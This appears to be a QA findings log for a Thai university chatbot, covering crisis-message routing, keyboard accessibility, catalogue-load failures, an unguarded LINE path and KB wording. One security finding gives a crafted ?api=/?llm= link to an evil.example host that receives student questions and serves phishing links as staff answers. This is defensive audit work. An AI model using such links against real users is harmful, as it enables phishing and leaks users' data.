confirmed.title: Crisis and wellbeing phrases get a cold generic not-found with exam chips
confirmed.repro: Ask 'อยากฆ่าตัวตาย', 'ฉันซึมเศร้า', 'โดนล่วงละเมิด', 'เหนื่อยจัง ท้อมาก อยากเลิกเรียน', 'เครียดมาก ทำไงดี', 'เรียนไม่ไหวทำไงดี'. The manual has the entry 'ช่องทางให้คำปรึกษาด้านสุขภาพใจ'.
confirmed.expected: A caring reply pointing to the mental-health counselling entry and staff, with no exam chips.
confirmed.actual: 'ขออภัยครับ ผมยังจับใจความคำถามนี้ไม่ได้' with chips (เรียนไรดี / ค่าเทอม... / Turnitin...); the last phrase gets the programme finder 'ผมยังไม่แน่ใจว่าหมายถึงหลักสูตรไหน'. Nothing supportive.
confirmed.fix:
Add a deterministic wellbeing branch in submissions/ui/chatbot.html, inside _askCore(), right after the smalltalk block (about line 1408) and before route_task and the programme resolver, so the finder and the KB tier gate cannot swallow it.

1. Add a small function, for example wellbeingKind(q). It returns 'crisis' for self-harm and abuse terms (ฆ่าตัวตาย, อยากตาย, ทำร้ายตัวเอง, ล่วงละเมิด, ข่มขืน, คุกคามทางเพศ) and 'stress' for ซึมเศร้า, เครียด, ท้อ, หมดไฟ, เหนื่อยมาก, ไม่ไหว, อยากเลิกเรียน, วิตกกังวล, นอนไม่หลับ. Use a regex over the normalised q.
2. For either kind, render a short caring line. Then render the manual entry 'ช่องทางให้คำปรึกษาด้านสุขภาพใจ'. Look it up from the loaded KB by title or id and reuse the same answer-card renderer that normal KB hits use, so the source label and the poster link appear. Add the staff hand-off. Show no exam chips and no 'จับใจความไม่ได้' text.
3. For 'crisis' only, add one safety line that needs no phone number (contact emergency services or someone you trust now). Add a hotline number only after the university confirms it, and label it as unverified until then.
4. Mirror the regex in the Rust/wasm classifier and in the JS twin (the same pattern used for the smalltalk logic in _shared/smalltalk.mjs), so both engines behave the same. A JS-only branch in chatbot.html would also run under ?engine=rust, so parity is not at risk.
5. Optional second fix: add ซึมเศร้า, ท้อ, หมดไฟ, ฆ่าตัวตาย and อยากเลิกเรียน to the keywords of the 'ช่องทางให้คำปรึกษาด้านสุขภาพใจ' entry in submissions/ui/knowledge-index.json. That alone is not enough, because 'เครียดมาก ทำไงดี' already contains a keyword and still failed.

Add the six phrases from the finding as a regression test.
notes:
REPRODUCED in my own headless Chrome (port 9714), with a fresh page per question, waiting for programmes.json, on both ?engine=rust and ?engine=js. Output is in /tmp/qa/verify/F08-0/out.txt and the script is /tmp/qa/verify/F08-0/run.mjs. The results are identical in both engines, so this is not a timing artefact or an engine difference.

Results, quoted as the bot replied:
- 'อยากฆ่าตัวตาย', 'ฉันซึมเศร้า', 'โดนล่วงละเมิด' and 'เครียดมาก ทำไงดี' all got: 'ขออภัยครับ ผมยังจับใจความคำถามนี้ไม่ได้ ลองกดตัวอย่างด้านล่าง...'. The chips were เรียนไรดี / ค่าเทอมวิศวกรรมชีวการแพทย์ ปริญญาเอก / ส่งรูปเล่มภายในกี่วัน / Turnitin เกิน 25% ทำอย่างไร. A generic staff line followed ('ยังไม่ตรงกับที่ต้องการใช่ไหมครับ ติดต่อเจ้าหน้าที่ได้เลย ☎️ ติดต่อบัณ...').
- 'เหนื่อยจัง ท้อมาก อยากเลิกเรียน' and 'เรียนไม่ไหวทำไงดี' got the programme finder: 'ผมยังไม่แน่ใจว่าหมายถึงหลักสูตรไหนครับ ... พบ 379 หลักสูตร ... 1) อยากเรียนระดับไหน'. The chips were degree levels. That is a misleading response to a distress message.
- Control: the exact manual title 'ช่องทางให้คำปรึกษาด้านสุขภาพใจ' answers correctly from the manual entry, in both engines. So the entry exists and works, and the gap is a routing or recall gap for natural wellbeing wording.

Cause: the entry's keywords are 'ช่องทางให้คำปรึกษาด้านสุขภาพใจ เครียด สุขภาพใจ ปรึกษาใจ mental wellbeing counseling'. Natural phrases (ซึมเศร้า, ฆ่าตัวตาย, ท้อ, ล่วงละเมิด) are not in the keywords, and no branch in _askCore() (chatbot.html ~line 1386) handles a wellbeing or crisis topic. Even 'เครียดมาก ทำไงดี', which contains the keyword 'เครียด', still does not reach the entry, so the KB tier gate or scope guard is rejecting it. I did not trace that part.

Severity: high, and I agree with it. A self-harm or abuse message gets a 'did not understand' reply with exam chips, and a stress message gets a degree-level picker. This is a duty-of-care failure, not a cosmetic one. It does not break the design rules, because the fix is deterministic and uses only manual facts.

Caveats on the suggestion: (1) the mental-health entry only gives a poster link and says to ask student affairs, with no phone number, so any hotline number is not in the manual. A hotline must be marked unverified, or left out until the university confirms it. A line like 'หากรู้สึกไม่ปลอดภัย โปรดติดต่อบริการฉุกเฉินหรือคนที่ไว้ใจทันที' needs no number, so it is safe. (2) The abuse and harassment case ('โดนล่วงละเมิด') has no matching manual entry that I checked, so it needs the staff hand-off plus a content decision from the owner.

Reproduced with fresh headless Chrome (port 9715), one fresh page per question, both ?engine=rust and ?engine=js. The results were identical in both engines and deterministic, with the same text on both runs. The script is /tmp/qa/verify/F08-1/run.mjs. I waited for the programmes.json load and for a new .msg.b without .typing. This is not a timing or selector artefact.

Results:
- 'อยากฆ่าตัวตาย', 'ฉันซึมเศร้า', 'โดนล่วงละเมิด' and 'เครียดมาก ทำไงดี' all got "ขออภัยครับ ผมยังจับใจความคำถามนี้ไม่ได้ ลองกดตัวอย่างด้านล่าง..." followed by the exam chips (เรียนไรดี / ค่าเทอมวิศวกรรมชีวการแพทย์ ปริญญาเอก / ส่งรูปเล่มภายในกี่วัน / Turnitin เกิน 25% ทำอย่างไร).
- 'เหนื่อยจัง ท้อมาก อยากเลิกเรียน' and 'เรียนไม่ไหวทำไงดี' got the programme finder: "ผมยังไม่แน่ใจว่าหมายถึงหลักสูตรไหนครับ ... พบ 379 หลักสูตร ... อยากเรียนระดับไหน".
- The control 'ขอคำปรึกษาด้านสุขภาพใจ' correctly returns the manual entry (หน้ากิจการนักศึกษามีหัวข้อให้คำปรึกษาด้านสุขภาพใจ ...). So the entry exists and works when the title words are used.

Notably, 'เครียดมาก ทำไงดี' still misses even though the entry's keywords include 'เครียด'.

Design intent: none of the design rules cover this. The not-found rule says an honest not-found with options and a staff hand-off. But the generic 'ไม่เข้าใจ' text plus exam chips is not caring for a self-harm or abuse disclosure. It is a safety gap on a student-facing page, not intended design.

Severity: high for the self-harm and abuse phrases (อยากฆ่าตัวตาย, โดนล่วงละเมิด). The milder stress phrases are medium. Overall high is fair.

Relevant code: the notUnderstood text is VOICE.notUnderstood at chatbot.html:609, rendered at about line 1708. _askCore starts at line 1386, with smalltalk first at about line 1397.

confirmed.title: Example chips, 'which one' choices, follow-ups and undo are not keyboard or screen-reader operable
confirmed.repro: Open the page with ?ai=off. Press Tab: focus goes nav, toggle, input, send and never lands on the 5 greeting chips. Ask 'อยากทำงานด้านข้อมูล เรียนอะไรดี', 'ปฏิทินการศึกษา' (13 choices), or 'เปิดรับสมัคร 2018D04G' (follow-ups). Check querySelectorAll('.chip,.dis') tabIndex and the AX tree.
confirmed.expected: Every clickable chip/choice is a button (or role=button + tabindex=0 + Enter/Space handler).
confirmed.actual: All 5 .chip and every .dis (including .followups .dis and the 'ไม่ใช่ — ถามแบบทั่วไป' undo) are <span> with click listeners only: tabIndex=-1, no role, no key handler (0 of 20 have a role). Keyboard users cannot use examples or any 'which one did you mean' list.
confirmed.fix:
Smallest fix, all in submissions/ui/chatbot.html and independent of the engine.

1. Add one shared helper (for example `_a11yClickables(root)`) that runs `root.querySelectorAll('.chip,.dis').forEach(el=>{ el.setAttribute('role','button'); el.tabIndex=0; })`.
   - Call it after the chips are rendered in the init function, right after line 477 and before `renderMood(false)`.
   - Call it where each answer is appended to `#chat`, and in the follow-ups builder `renderFollowups` around line 1865.
   - Alternative: a single `MutationObserver` on `#chips` and `#chat` that applies the helper to new nodes. This covers every `.dis` site (1086, 1093, 1357, 1442, 1473, 1515, 1609, 1690, 1709, 1734) and the finder with no per-site edits.
2. Add one delegated key handler: `document.addEventListener('keydown', e=>{ const t=e.target.closest?.('.chip,.dis'); if(t && (e.key==='Enter'||e.key===' ')){ e.preventDefault(); t.click(); } })`. Every existing click listener already works through `.click()`.
3. Add CSS `.chip:focus-visible,.dis:focus-visible{outline:2px solid var(--accent);outline-offset:2px}`. Check that `.dis` already has a focus style.
4. Optionally convert the spans to `<button type="button">` in the templates instead. That needs resetting the button styles and is more invasive. The role, tabindex and key-handler route is smaller and keeps the current look.
notes:
Reproduced in my own headless Chrome (port 9716, ?ai=off, fresh profile) by two independent methods, both deterministic.

1. DOM inspection of `.chip,.dis`:
- Greeting: 5 `.chip` elements, all `SPAN`, tabIndex=-1, role=null. Texts include "🟢 เรียนไรดี" and "🟢 ส่งรูปเล่มภายในกี่วัน".
- "ปฏิทินการศึกษา": 13 `.dis` choices, all SPAN, tabIndex=-1, role=null. The choices are 5 programme titles plus the level chips "ปริญญาโท · 240 (เปิด 133)" etc. and "เริ่มใหม่".
- "เปิดรับสมัคร 2018D04G": follow-ups "แล้วค่าเทอมล่ะ" and "มีทุนไหม" are SPAN, tabIndex=-1, role=null.
- "อยากทำงานด้านข้อมูล เรียนอะไรดี": 11 finder `.dis` (levels, open/intl/special, area topics, "เริ่มใหม่"), all SPAN, tabIndex=-1, role=null.
- I did not trigger the "ไม่ใช่ — ถามแบบทั่วไป" undo. The code shows it is the same unfocusable span (chatbot.html lines 1473 and 1734).

2. Real key events via CDP.
- Tab walk gave: A.brand, A.on, A, A, BUTTON#ev-toggle, INPUT#q, BUTTON#send, then BODY. Focus never lands on a chip. This matches the report's "nav, toggle, input, send".
- I called `.chip.focus()` on the first chip and sent Enter. Nothing happened: the chat still had 1 message, so no question was asked. A span with tabindex=-1 cannot be tabbed to, and Enter is not mapped to click anyway.

Code check confirms it:
- Line 476 renders the chips as `<span class="chip ...">`.
- Line 477 wires `click` only.
- The `.dis` spans (lines 1086, 1093, 1357, 1442, 1473, 1515, 1609, 1690, 1709, 1734, 1865) are all `<span>` with click listeners only.
- The only keydown handlers are on the `#q` input (line 1883) and the `.dis-filter` input (line 1348). Nothing makes `.chip` or `.dis` operable by keyboard.
- Not design intent: none of the DESIGN RULES covers this.

Severity: I put it at medium, not high.
- It is a real WCAG 2.1.1 (Keyboard) and 4.1.2 (Name, Role, Value) failure.
- The core path still works by keyboard: the input and send button are reachable and typing a question works.
- The gap is the example chips and the "which one" picks, which are shortcuts. The user can retype the title.
- It is still a notable gap for screen-reader and keyboard-only students. Treat it as high only if the accessibility bar is strict.

Reproduced 100% on a fresh headless Chrome (port 9717) with ?ai=off, using two independent checks: real Tab key events via CDP Input.dispatchKeyEvent, and DOM inspection.

1. Tab order. Eight Tab presses visited A.brand, A.on, A, A, BUTTON#ev-toggle, INPUT#q, BUTTON#send, then BODY. No greeting chip was ever focused.
2. Greeting chips. All 5 .chip elements are SPAN, tabIndex -1, role null.
3. 'อยากทำงานด้านข้อมูล เรียนอะไรดี': 14 .dis elements, all SPAN, tabIndex -1, no role.
4. 'ปฏิทินการศึกษา': 13 .dis elements, all SPAN, tabIndex -1, no role.
5. 'เปิดรับสมัคร 2018D04G': 2 .dis elements (the follow-ups), SPAN, tabIndex -1.
6. The only buttons inside #chat in each of those answers were 2 real <button>s, and neither is a choice chip.
7. The accessibility tree for the last page has only 4 role=button nodes, all in the page chrome.
8. Code review. The chips are built as <span class="chip"> at chatbot.html line 476. The .dis spans are built at lines 1086, 1093, 1357, 1442, 1473, 1515, 1609, 1690, 1709, 1734 and 1865. Each is wired with click listeners only. The only keydown handlers in the file are on #q (line 1883) and on the .dis-filter input (line 1348). There is no role, tabindex or key handling for chips anywhere, and no :focus-visible style.

Severity high is justified. Keyboard and screen-reader users cannot use the example chips, any 'which one did you mean' list, the finder (level, faculty, topic), the follow-ups or the undo. They can still type, so the chatbot is not wholly blocked, but the disambiguation flow, the main route to an answer, is unreachable. It is a WCAG 2.1.1 failure. This is not design: no DESIGN RULE covers it, and the page already uses role and aria labels elsewhere.

Minor gap in the original report: the 'which one' chips are not only lines 1442 to 1690. The finder buttons (line 1086) are also affected. Separately, the .golink elements were not checked.

confirmed.title: Programme questions get a wrong generic answer while programmes.json is loading or has failed, with no notice
confirmed.repro: Block or delay programmes.json (slow 3G makes the 2 MB file take ~67 s; CDP Fetch 404/500/12 s delay). Open the page and click the first chip 'ค่าเทอมวิศวกรรมชีวการแพทย์ ปริญญาเอก', then ask 'หลักสูตรจิตวิทยาคลินิกเปิดรับสมัครไหม', 'เรียนไรดี', 'ทำงานอะไรดี'. Scripts /tmp/qa/robustness/early.mjs, state.mjs.
confirmed.expected: A fee table, or an honest 'programme list still loading/unavailable, retry or open the official page'.
confirmed.actual: The fee question returns the generic how-to-apply entry as 'ข้อมูลทางการ'; 'เรียนไรดี' returns 'จับใจความไม่ได้'. Input is enabled at ~0.2 s (fast) / ~16 s (3G) but the catalogue arrives ~67 s, or never on 404/500, with no loading or failure notice.
confirmed.fix:
File: /Users/ozone/projects/ReflexWork/submissions/ui/chatbot.html.

1. In load() (line 459), add a `let PROG_STATE='loading'`. Set 'ok' on success, and 'failed' on a non-ok response, a bad shape, or a catch. Add a bounded retry (for example 2 more tries with backoff) for failures. Treat a fetch that takes more than ~10 s as still 'loading'.
2. In _askCore, just before the programme path (`const prog = pinned ? null : resolveProgramme(q, PROG)` at ~line 1427), add an early return. Condition: `PROG_STATE!=='ok' && !pinned && (isFinderQuestion(q) || isCareerQuestion(q) || _P_TOPIC.some(([,re])=>re.test(q)) || hasStudyIntent(q))`. These helpers already exist (lines 1054, 1069, 1071, 836). Reply honestly with:
   - 'loading': "รายการหลักสูตรทางการกำลังโหลดอยู่ ลองถามอีกครั้งในอีกสักครู่".
   - 'failed': "โหลดรายการหลักสูตรไม่สำเร็จ", plus a retry button.
   - Both: the official programme-list link and the staff hand-off.
   Do not fall through to KB search.
3. Optionally, grey out or tag the programme-shaped example chips until PROG_STATE is 'ok'.
4. Make sure the deploy serves programmes.json compressed (gzip or brotli). Pages does this by default; the local python server does not.
Keep the JS and Rust engines consistent. The guard sits in the JS orchestration, so the wasm engine needs no change.
notes:
Reproduced with two independent failure modes, in my own Chrome (port 9718), using CDP Fetch interception. Script: /tmp/qa/verify/F10-0/t.mjs, with a lib.mjs copy on port 9718.

Control (programmes.json loads normally):
- The fee question returns a real fee table: "ข้อมูลทางการ 💰 ค่าธรรมเนียม (ตามประกาศ ปีการศึกษา 2570) ... เหมาจ่าย 30,000 บาท/ภาคการศึกษา".
- The clinical-psychology question returns "สถานะ ... ปิดรับสมัครแล้ว".
- 'เรียนไรดี' returns the finder ("พบ 379 หลักสูตร").
- 'ทำงานอะไรดี' returns the career narrowing.

programmes.json returns 404, or is delayed 60 s (I ran both):
- Fee question: "✅ ข้อมูลทางการ เลือกหลักสูตรจากหน้าหลักสูตรที่เปิดรับสมัคร ตรวจคุณสมบัติ... ลงทะเบียนผู้สมัคร ..." with source "ที่มา: เริ่มสมัครเข้าศึกษาระดับบัณฑิตศึกษาอย่างไร". This is the generic how-to-apply entry, labelled official, and it has no fee numbers.
- 'หลักสูตรจิตวิทยาคลินิกเปิดรับสมัครไหม': generic entry "การตรวจว่าหลักสูตรใดกำลังเปิดรับสมัคร ... ผลที่เก็บวันที่ 26 ตุลาคม 2569 ... 346 รายการ". It is not wrong, but it gives no status for that programme.
- 'เรียนไรดี': "ขออภัยครับ ผมยังจับใจความคำถามนี้ไม่ได้".
- 'ทำงานอะไรดี': "ขออภัยที่ยังหาคำตอบที่ตรงให้ไม่ได้".
- No loading or failure notice appears in any of these. The page never retries.

Cause, in chatbot.html:
- load() fires `fetch('./programmes.json')...catch(()=>{})` fire-and-forget at line 459, then enables input at line 461.
- Every programme branch in _askCore is guarded by `PROG.length` (lines 1458, 1464, 1484, 1673 and 1678), or by `resolveProgramme` running on an empty list. So they silently fall through to KB search or not-found.

Severity: medium, not high.
- The static server here sends no compression (Content-Length 2,580,825). The reporter's ~67 s figure is for uncompressed 3G. I did not measure what production serves. Cloudflare Pages normally compresses JSON, so I would expect the slow-load window to be much shorter there.
- The harmful case is only a slow or failed fetch. The fee question gets the wrong "official" answer, and the page is a Thai-first assistant for students.
- The answer is not a fabricated fact. It is a real manual entry that does not match the question.
- Design rules are not violated, but the honest-not-found spirit is. The page does not admit the catalogue is missing.
- One detail from the report's exact repro that I did not test: clicking the first chip rather than typing the same text.
- Also untested: the claim that input is enabled at ~16 s on 3G.

REPRODUCED in my own Chrome (port 9719), two ways, one fresh tab per mode, script /tmp/qa/verify/F10-1/r.mjs. I used CDP Fetch to give programmes.json a 404 and a 30 s delay, and ran a normal load as a control. The control loaded 379 programmes and gave correct answers. Input was enabled at about 0.2 s in every mode, with no loading or failure notice.

Control (catalogue loaded):
- Fee question: fee table starting "ค่าธรรมเนียม (ตามประกาศ ปีการศึกษา 2570) • นักศึกษาไทย · แผน 1.1 ... 30,000 บาท/ภาคการศึกษา".
- Clinical psychology: "ปิดรับสมัครแล้ว (ปีการศึกษา 2570 · รับ 10 คน)".
- 'เรียนไรดี' and 'ทำงานอะไรดี': finder and career pickers, "พบ 379 หลักสูตร".

404 mode (PROG.length = 0):
- Fee question: "✅ ข้อมูลทางการ เลือกหลักสูตรจากหน้าหลักสูตรที่เปิดรับสมัคร ตรวจคุณสมบัติ... จากนั้นลงทะเบียนผู้สมัคร..." This is the generic how-to-apply entry, labelled official, and it has no fee numbers.
- Clinical psychology: the generic "ตรวจจากระบบหลักสูตรที่เปิดรับสมัคร ... 346 รายการ" entry. It gives no status for this programme.
- 'เรียนไรดี': "ขออภัยครับ ผมยังจับใจความคำถามนี้ไม่ได้ ..." with example chips and a staff hand-off.
- 'ทำงานอะไรดี': "ขออภัยที่ยังหาคำตอบที่ตรงให้ไม่ได้ ... ติดต่อเจ้าหน้าที่".

Delay mode (30 s) gave identical output to 404. It is deterministic, not a timing artefact.

Severity: medium, not high. Nothing is invented, because every answer is a real manual entry. The not-found paths do offer a staff hand-off. The real harm is two things. The fee and status questions get an off-target answer under the "ข้อมูลทางการ" label. The "จับใจความไม่ได้" reply blames the student's wording when the catalogue is what is missing. It only happens during the load window or when the fetch fails. I did not measure the 3G ~67 s figure, but the code shows no mitigation. The honesty rule is violated softly: the page never says that the programme list is missing.

Design intent: no. The code comment at chatbot.html:458 says "until it arrives the programme path is simply off". That is a deliberate degrade-silently choice, not one of the listed design rules. It conflicts with the rule that an unknown question gets an honest not-found with options.

Other facts: the local static server sends no gzip. programmes.json is 2,580,825 bytes with Content-Length and no Content-Encoding. I did not check the production host.

confirmed.title: ?api= and ?llm= accept any origin: a crafted link sends student questions to an attacker and shows attacker text as staff answers
confirmed.repro: Open /chatbot.html?api=https://evil.example&llm=https://evil2.example (or ?api=//evil.example); on production https://reflexwork.pages.dev/chatbot?api=...&llm=.... With a local fake kernel whose /live-kb returns an entry titled 'ส่งรูปเล่มภายในกี่วัน' (and one with approved_at:1e20), ask that title, then any unanswerable question.
confirmed.expected: Only the project's own origins (or localhost for dev) are contacted; any other value ignored or visibly flagged.
confirmed.actual: The page contacts the attacker origins: GET /live-kb, POST /gap (unanswered question text), POST /feedback (full question), POST /rewrite and /llm. Attacker entries outrank the real manual and show '📝 เจ้าหน้าที่ตอบ' with attacker text/links (line.me, *.canva.site); fake LLM text shows under '🤖 AI ช่วยเรียบเรียง จากข้อมูลทางการ'. No banner. approved_at:1e20 makes kbBody() throw RangeError so the question gets no answer. ?ai=off never calls /rewrite or /llm.
confirmed.fix:
1) In chatbot.html, add an allow-list helper used by pickBackends() for the ?api=, ?llm=, AGENCY.kernelApi and AGENCY.llmApi values. Parse with new URL(v, location.href). Accept the value only if the origin is in {https://reflexwork-kernel.solana-thailand.workers.dev, https://reflexwork-llm-proxy.solana-thailand.workers.dev, http://127.0.0.1:*, http://localhost:*}, or location.origin when the page itself is served from localhost. Otherwise ignore it and fall back to the default (or '' for a customised agency). Reject protocol-relative values like //evil. Keep an escape hatch for agency.json, because other organisations legitimately name their own workers. Make that opt-in (for example only an https origin stated in agency.json itself), and never let the URL query set a non-allow-listed origin. When an override is accepted, show a visible "test backend" banner.
2) In refreshLiveKb() (line ~443), sanitise approved_at: `const t=Number(e.approved_at); approved_at:(Number.isFinite(t)&&t>0&&t<8.64e15)?t:0`. In kbBody() (line 692), wrap the date formatting in try/catch so a bad date drops only the date tag.
notes:
Reproduced 3/3 in a fresh headless Chrome (port 9720, script /tmp/qa/verify/F11-0/t.mjs). I ran a fake kernel on 127.0.0.1:9730 and mapped evil.example to it with --host-resolver-rules, so the page saw a genuinely foreign origin. I loaded http://127.0.0.1:8791/chatbot.html with ?api=http://evil.example:9730&llm=http://evil.example:9730. The ?api=//evil.example:9730 form behaves the same.

Code cause: pickBackends() (chatbot.html ~1803-1805) assigns qp.get('api') and qp.get('llm') with no validation. AGENCY.kernelApi and llmApi are likewise unchecked. The comment at ~1801 says "or ?api= / ?llm= is given", so the override is intentional for local dev, but nothing restricts the origin.

Results:
- GET evil.example:9730/live-kb fired on page load, and again every 15s (line 470).
- Asking the fake entry's title "ส่งรูปเล่มภายในกี่วัน" gave "📝 เจ้าหน้าที่ตอบ 📝 คำตอบที่เจ้าหน้าที่เพิ่ม · 14 พ.ย. 2566 (ยังไม่อยู่ในคู่มือหลัก) ติดต่อ https://line.me/R/ti/p/@evil เพื่อส่งรูปเล่ม • จ่ายที่ https://evil.canva.site". The attacker text and links replaced the real manual answer.
- With an unanswerable question ("ขอแนะนำร้านอาหารอร่อยแถวศาลายาหน่อย xyzzy"), the attacker server received POST /gap {"q":"<full question>","source":"web"} and POST /rewrite {"input":"<question>"}.
- With &ai=off, /gap and /live-kb were still sent, but /rewrite was not, as the finding says.
- With approved_at:1e20, the question got no answer. The page stayed on the welcome bubble until my 15s timeout. new Date(1e20).toISOString() throws RangeError inside kbBody (line 692), and Number(e.approved_at)||0 does not guard against it. This confirms the finding's claim about the RangeError.
- No banner or warning is shown.

I did not test /feedback or the /llm path in the run. They use the same unvalidated KERNEL_API and LLM_API (lines 1180 and 1825), so I expect the same behaviour.

Severity: I put it at medium rather than high. It needs the victim to open a crafted link, there is no login or cookie to steal, and HTML is escaped, so there is no XSS. The impact is still real: it is a phishing and privacy risk on the official domain, with spoofed "staff" answers and leaked question text. The approved_at crash is a separate low-severity robustness bug, but it only appears with a malicious or buggy backend.

Reproduced on the first run. Page: http://127.0.0.1:8791/chatbot.html?api=http://127.0.0.1:9722&llm=http://127.0.0.1:9722, own Chrome on port 9721.

Code check: pickBackends() (chatbot.html:1803-1805) does KERNEL_API = qp.get('api') || ..., with no origin validation. refreshLiveKb, the /gap posts (lines 1546, 1623, 1816), /feedback (1825), /rewrite (1153) and /llm (1180) all use these values directly.

Observed in the run:
- A1 (asked 'ส่งรูปเล่มภายในกี่วัน'): the answer was the attacker's text under the badge '📝 เจ้าหน้าที่ตอบ'. Quoted: 'EVIL ส่งที่ line.me/evil'. It beat the real manual entry, which only appeared as a follow-up chip.
- A2 (an unanswerable question): the fake server received 'POST /gap {"q":"ซื้อหมูกระทะที่ไหนดีที่สุดในโลก","source":"web"}' and 'POST /rewrite {"input":"<the question>"}'. Question text left the page. GET /live-kb was also hit on load and on the 15s refresh. I did not test /feedback or /llm live. /feedback goes through the same unvalidated KERNEL_API.
- No banner was shown.

What I did not confirm:
- approved_at:1e20 makes new Date(1e20).toISOString() throw RangeError (checked in node). kbBody() builds the staff tag with it at line 692. In the run the junk entry only appeared as a chip 'x'. The throw happens only if that entry is the one answered, so the claim that it silences the question is plausible but not shown end to end.
- ?ai=off skips /rewrite and /llm (AI_OFF checks at lines 1150, 1176, 1721). The /gap, /feedback and /live-kb calls only check KERNEL_API, so they are still sent.

Severity: medium, not high. An attacker needs the victim to click a crafted link. Questions are not credentials. The ?api/?llm override is a documented dev feature (comments at lines 1801 and 1806), so this is a missing allow-list, not a design rule. The real harm is that staff-badged phishing text and links are shown on a trusted domain, and student questions are exfiltrated.

confirmed.title: LINE advice answers skip groundedGuard and the grounded context is truncated at 2000 chars
confirmed.repro: Read line-worker/worker.mjs isAdvice branch: groundedPrompt(text, entries) goes to askTeam(ground, bag); team-adapter gemini toRequest is { input } only; in llm-proxy /llm grounded = body.context.trim().length > 0 is false, so the ungrounded prompt is used and groundedGuard never runs. prompt = String(body.input).slice(0,2000); groundedPrompt('อยากลาพักการศึกษา ควรทำยังไง', top 3) is 2316 chars; 9 of 44 random triples exceed 2000. Code-derived, LINE not driven.
confirmed.expected: Same numeric/Latin guard as the web and the full manual excerpt.
confirmed.actual: Any number, date or phone the model adds goes straight to the LINE user; the manual excerpt is cut mid-text so the model sees incomplete 'ข้อมูลคู่มือ'.
confirmed.fix: Smallest fix: let `askTeam(input, env, opts)` accept `opts.context`, and have the gemini `toRequest(input, env, ctx)` return `{ input: question, context }`. Then in line-worker/worker.mjs call `askTeam(question, bag, { context: <the "[i] title\nanswer" joined text> })`. This needs a small split of `groundedPrompt` in _shared/intake.mjs into a question part and a context-building helper. The proxy then takes the grounded branch: the 2000-char limit applies to the question only, context allows 4000, and `groundedGuard` runs at L262/L307. Fallback option: run an equivalent groundedGuard in the LINE worker on `r.text`. Also consider raising the `context` slice (4000) if three long entries still exceed it.
notes:
I confirmed this by reading the code. I did not drive the LINE worker, and I did not re-measure the 2316-char or 9-of-44 figures (my measuring script found 0 entries because I guessed the knowledge-index.json structure wrong). The mechanism is clear in the source.

1. Where the answer comes from. In integrations/line-worker/worker.mjs (~L224-227), an advice question builds `groundedPrompt(text, searchKB(text).map(r=>r.e))` and calls `askTeam(ground, bag)`. The KB excerpt is embedded inside the `input` string.
2. What gets sent. The gemini provider in integrations/_shared/team-adapter.mjs (L71) uses `toRequest: (input) => ({ input })`. No `context` field is sent.
3. What the proxy does. In integrations/llm-proxy/worker.mjs:
   - L183: `prompt = String(body.input).slice(0,2000)`. The whole grounded prompt (rules plus 3 KB entries) is cut at 2000 chars, so the manual excerpt can be truncated mid-text. Each entry's answer is untruncated, so 3 entries easily pass 2000.
   - L212-213: `context = body.context`, which is empty here, so `grounded = false`.
   - L262 and L307 only call `groundedGuard` when `grounded` is true. The LINE path therefore never gets the numeric/Latin guard.
   - The proxy also uses the generic ungrounded system prompt instead of the strict grounded one. The strict rules survive only as text inside the user prompt.
4. The web page uses a separate `context` param, as the comment in intake.mjs L98 ("Used when askTeam has no separate context param") implies. So LINE is the odd path out. That is not a design rule.

Why I rate it medium, not high: it only affects advice-type questions (isAdvice) that also reach the 'confident' tier. The strict fact rules are still in the prompt text, and the fallback on AI failure is the raw KB answer. The risk is an unguarded model adding numbers, dates or phones, or answering from a truncated excerpt. It breaks the "AI never improvises facts" rule on the LINE channel, but no wrong answer was observed live.

Verified by reading the code and by measuring prompt lengths. I did not drive LINE or Chrome, because the finding is a code path and the web page does not exercise it. 1) integrations/line-worker/worker.mjs lines 224-227: the isAdvice branch builds groundedPrompt(text, searchKB(text) top 3) and calls askTeam(ground, bag). 2) integrations/_shared/team-adapter.mjs line 71: the gemini provider's toRequest is (input) => ({input}), so no context field is sent. 3) integrations/llm-proxy/worker.mjs: line 183 does prompt = String(body.input).slice(0,2000). Lines 212-213 set context = body.context (empty here), so grounded is false. Line 307 runs groundedGuard only when grounded is true, so the guard never runs for LINE. The model's text goes straight to the user at worker.mjs line 229. The web page does it differently: chatbot.html line 1182 sends {input:q, context}, so it takes the grounded branch with the guard and a 4000-char context limit. The only mitigation is the instruction text inside groundedPrompt, and that is not a guard. Measured with the real groundedPrompt over knowledge-index.json, using consecutive triples of entries: 9 of 44 triples exceed 2000 chars, and the longest is 4499 chars. Entries are cut mid-text. The model therefore answers from incomplete 'ข้อมูลคู่มือ'. It sees no guard and may fill in the gap. The truncation claim is correct, and the exact 2316-char figure was not re-checked. The skipped guard is a defect, but it sits behind several conditions: it needs the confident tier, an advice-type question, an AI that adds a number or Latin name, and a configured proxy. This is why I rate it medium rather than high. It does break the design rule that facts come only from the manual and the AI never improvises facts. The guard only checks numbers with units and Latin tokens, but that is the same strength the web gets.

confirmed.title: About 35 KB entries still speak to the bot or reviewer instead of the student (kb-wording-requests only partly applied)
confirmed.repro: Ask the entry titles, e.g. 'เลือกหลักเกณฑ์ทะเบียนแบบหน่วยกิตหรือเหมาจ่ายให้ตรงผู้เรียน', 'ตรวจค่าเล่าเรียนให้ตรงปีเข้าศึกษา คณะ หลักสูตร และระบบค่าธรรมเนียม', 'รายชื่อและตำแหน่งกรรมการในหน้าลงนามต้องตรงกับอะไร', 'ไฟล์ PDF สำหรับส่งรูปเล่มต้องเตรียมอย่างไร ขนาดเท่าไร', 'สมัครกิจกรรมและตรวจผล Soft Skills ได้ที่ไหน'; or regex scan knowledge-index.json.
confirmed.expected: Student-facing advice. docs/kb-wording-requests.md says the 19 listed entries were rewritten.
confirmed.actual: Remaining: gm_registration_payment_rules 'ห้ามนำกฎคนละรุ่นมาใช้แทนกัน ห้ามอ้างว่า...'; gm_registration_after_defense_flat 'ถ้าไม่ทราบกฎที่ใช้ ให้แสดงความต่างและถามข้อมูลก่อน...'; gm_registration_fee_navigation 'ก่อนตอบจำนวนเงิน ต้องระบุ...'; gm_programme_availability 'ต้องตรวจใหม่ก่อนตอบ'; gm_thesis_submission_03/05/09/13 'ต้องถามว่า...ก่อน', 'ระบบ AI ดูคิวไม่ได้'; gm_registration_exemption_2570 'ตามกรอบแดง'; gm_registration_services 'ไม่ได้หมายความว่า AI เข้าถึงบัญชี'; gm_sample_2018DG00_2570_documents is one sentence with no usable fact; 7 Soft Skills entries 'ไม่ตีความว่า...'; set-2 entries still have 'ไม่สรุปวงเงิน...', 'ไม่สลับปีงบประมาณ...', 'อย่าเหมารวม... แชทนี้บอกไม่ได้'. The doc status line overstates what was done.
